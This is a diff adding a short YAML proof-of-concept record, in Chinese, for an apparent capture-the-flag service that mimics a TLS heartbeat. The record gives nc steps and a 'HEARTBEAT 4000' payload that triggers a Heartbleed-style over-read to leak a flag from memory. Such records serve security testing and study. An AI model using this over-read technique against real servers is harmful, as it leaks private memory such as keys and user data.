@@ -1,0 +1,18 @@
+info:
+  name: tls-heartbeat-heartbleed-line-protocol
+  cve: ''
+  summary: TCP行协议模拟TLS心跳服务，HEARTBEAT命令声称长度大于实际载荷导致越界读泄露内存中的flag
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: TCP行协议模拟TLS心跳服务，HEARTBEAT命令声称长度大于实际载荷导致越界读泄露内存中的flag
+  steps:
+  - 1. nc连上端口，HELP枚举命令集
+  - 2. SETPAYLOAD 设置短载荷
+  - 3. HEARTBEAT <大长度> 声称长度大于实际载荷，触发越界读
+  - 4. 逐步增大长度(100/500/1000/2000/4000/8000)搜索flag{...}模式
+  - 5. 在len=4000时读到flag
+  payload: SETPAYLOAD X\nHEARTBEAT 4000\n
+  verification: TCP行协议模拟TLS心跳服务，HEARTBEAT命令声称长度大于实际载荷导致越界读泄露内存中的flag
